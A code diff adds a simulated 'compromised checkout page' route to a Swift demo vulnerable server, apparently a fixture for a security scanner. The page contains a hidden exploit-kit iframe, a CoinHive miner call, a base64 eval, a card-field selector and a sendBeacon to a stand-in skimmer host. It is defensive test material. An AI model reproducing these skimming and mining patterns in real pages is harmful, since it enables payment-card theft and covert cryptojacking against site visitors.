@@ -179,6 +179,7 @@ public final class DemoTargetServer: @unchecked Sendable {
                 <a href="/vuln/xss?q=welcome">Search Page (Reflected XSS Indicator)</a>
                 <a href="/vuln/dir/">Public Directory</a>
                 <a href="/vuln/api/users">Users REST API</a>
+                <a href="/vuln/malware.html">Compromised Page</a>
                 <a href="/vuln/index.html?redirect=https://example.com">Redirect Endpoint</a>
 
                 <form method="POST" action="http://127.0.0.1:\(port)/vuln/login">
@@ -229,6 +230,26 @@ public final class DemoTargetServer: @unchecked Sendable {
 
         if path == "/vuln/dir/" || path == "/vuln/dir" {
             return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: "<html><head><title>Index of /vuln/dir/</title></head><body><h1>Index of /vuln/dir/</h1><a href=\"../\">Parent Directory</a></body></html>")
+        }
+
+        if path == "/vuln/malware.html" {
+            let body = """
+            <!DOCTYPE html>
+            <html>
+            <head><title>Infected Page Simulation</title></head>
+            <body>
+                <h1>Checkout Page (Simulated Malware Infection)</h1>
+                <iframe width="0" height="0" src="https://malicious-tds.invalid/exploit-kit"></iframe>
+                <script>
+                    var miner = new CoinHive.Anonymous('site-key-simulation');
+                    eval(atob("Y29uc29sZS5sb2coJ3NpbXVsYXRlZC1kcm9wcGVyJyk="));
+                    var cards = document.querySelectorAll("input[name*=card_number]");
+                    navigator.sendBeacon("https://magecart-collector.invalid/steal", "test");
+                </script>
+            </body>
+            </html>
+            """
+            return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: body)
         }
 
         if path == "/vuln/api/users" {
